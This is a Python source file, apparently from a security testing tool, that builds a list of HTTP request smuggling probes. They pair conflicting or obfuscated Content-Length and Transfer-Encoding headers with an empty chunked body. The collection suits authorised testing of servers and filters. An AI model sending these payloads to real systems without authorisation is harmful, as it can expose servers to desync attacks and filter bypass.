from __future__ import annotations

from bypass.models import Payload, PayloadCategory


def smuggling_lite_payloads() -> list[tuple[dict[str, str], bytes, Payload]]:
    probes: list[tuple[dict[str, str], bytes, str, str, list[tuple[str, str]] | None]] = [
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_te_basic",
            "CL+TE baseline conflict",
            None,
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked", "Connection": "keep-alive"},
            b"0\r\n\r\n",
            "smuggle_cl_te_keepalive",
            "CL+TE with keep-alive",
            None,
        ),
        (
            {"Transfer-Encoding": " chunked", "Content-Length": "4"},
            b"0\r\n\r\n",
            "smuggle_te_space",
            "TE obfuscation leading space",
            None,
        ),
        (
            {"Transfer-Encoding": "chunked", "Content-Length": "4, 5"},
            b"0\r\n\r\n",
            "smuggle_dup_cl_comma",
            "Duplicated CL comma style",
            None,
        ),
        (
            {"Content-Length": "0", "Transfer-Encoding": "chunked", "X-Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_x_te",
            "X-Transfer-Encoding confusion",
            None,
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked, identity"},
            b"0\r\n\r\n",
            "smuggle_te_multi",
            "TE multiple values",
            None,
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "Chunked"},
            b"0\r\n\r\n",
            "smuggle_te_casing",
            "TE mixed casing",
            None,
        ),
        (
            {"Content-Length": "04", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_leading_zero",
            "CL leading zero + TE",
            None,
        ),
        (
            {"Content-Length": "+4", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_plus",
            "CL plus sign + TE",
            None,
        ),
        (
            {"Content-Length": "4 ", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_space",
            "CL trailing space + TE",
            None,
        ),
        (
            {"Content-Length": "4\t", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_cl_tab",
            "CL trailing tab + TE",
            None,
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_dup_cl_split",
            "Duplicate Content-Length split values",
            [("Content-Length", "4"), ("Content-Length", "5"), ("Transfer-Encoding", "chunked")],
        ),
        (
            {"Content-Length": "4", "Transfer-Encoding": "chunked"},
            b"0\r\n\r\n",
            "smuggle_dup_te_split",
            "Duplicate Transfer-Encoding split values",
            [("Content-Length", "4"), ("Transfer-Encoding", "identity"), ("Transfer-Encoding", "chunked")],
        ),
    ]
    out: list[tuple[dict[str, str], bytes, Payload]] = []
    for hdrs, body, pid, label, raw_headers in probes:
        metadata = {"raw_headers": raw_headers or list(hdrs.items())}
        out.append(
            (
                hdrs,
                body,
                Payload(id=pid, category=PayloadCategory.SMUGGLING, label=label, metadata=metadata),
            )
        )
    return out
